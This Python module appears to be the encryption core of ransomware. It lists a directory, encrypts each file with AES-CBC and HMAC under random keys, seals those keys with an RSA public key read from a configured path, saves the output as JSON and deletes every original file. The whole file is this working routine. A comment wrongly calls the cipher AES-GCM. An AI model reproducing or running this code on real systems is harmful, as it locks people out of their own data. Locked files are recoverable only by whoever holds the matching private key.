import os

from fileManagement import saveFileAsJSON
from base64 import b64encode
from cryptography.hazmat.primitives.asymmetric import padding as a_padding
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import serialization, hashes, hmac, padding
from cryptography.hazmat.primitives.ciphers import (
    Cipher, algorithms, modes
)
from keyPaths import keyPaths

key_size = 32
IVLength = 16

def encryptDirectory(filepathToDirectory):
    fileList = os.listdir(filepathToDirectory)
    os.chdir(filepathToDirectory)
    for file in fileList:
         if(not os.path.isdir(file)):
             name, ext = os.path.splitext(file)
             with open(file, "rb") as someData:
                plaintext = someData.read()
             RSAcipher, ciphertext, iv, tag = RSAEncrypt(plaintext,  keyPaths.pathToPublicKey)
             saveFileAsJSON(name + '.json', ciphertext, iv, RSAcipher, tag,  ext)
             os.remove(file)

def messageEncryptMAC (message):

    padder = padding.PKCS7(128).padder()
    padded_data = padder.update(message) + padder.finalize()

    ENCKey = os.urandom(key_size)
    HMACKey = os.urandom(key_size)

    ciphertext, iv, tag = encryptMAC(ENCKey, HMACKey, padded_data)

    return (ciphertext, iv, tag, ENCKey, HMACKey)

def encryptMAC(ENCKey, HMACKey, plaintext):
    if len(HMACKey) < key_size:
        print("Error: the hash key must be greater than 256-bits in length")
        return ()

    ciphertext, iv = encrypt(ENCKey, plaintext)

    h = hmac.HMAC(HMACKey, hashes.SHA256(), backend=default_backend())
    h.update(ciphertext)
    tag = h.finalize()

    return ciphertext, iv, tag

def encrypt(key, plaintext):
    if len(key) < key_size:
        print("Error: the key must be greater than 256-bits in length")
        return ()

    # Initializes the iv
    iv = os.urandom(IVLength)
    # Construct an AES-GCM Cipher object with the given key and a
    # randomly generated IV.
    encryptor = Cipher(
        algorithms.AES(key),
        modes.CBC(iv),
        default_backend()
    ).encryptor()

    # Encrypt the plaintext and get the associated ciphertext.
    ciphertext = encryptor.update(plaintext) + encryptor.finalize()

    return (ciphertext, iv)

def RSAEncrypt(message, RSA_Publickey_filepath):

    ciphertext, iv, tag, ENCKey, HMACKey = messageEncryptMAC(message)

    combinedKey = ENCKey + HMACKey

    #load
    with open(RSA_Publickey_filepath, "rb") as key_file:
        public_key = serialization.load_pem_public_key(
            key_file.read(),
            backend=default_backend()
        )
    RSACipher = public_key.encrypt(
        combinedKey,
        a_padding.OAEP(
        mgf=a_padding.MGF1(algorithm=hashes.SHA256()),
        algorithm=hashes.SHA256(),
        label=None
        )
    )

    return(RSACipher, ciphertext, iv, tag)
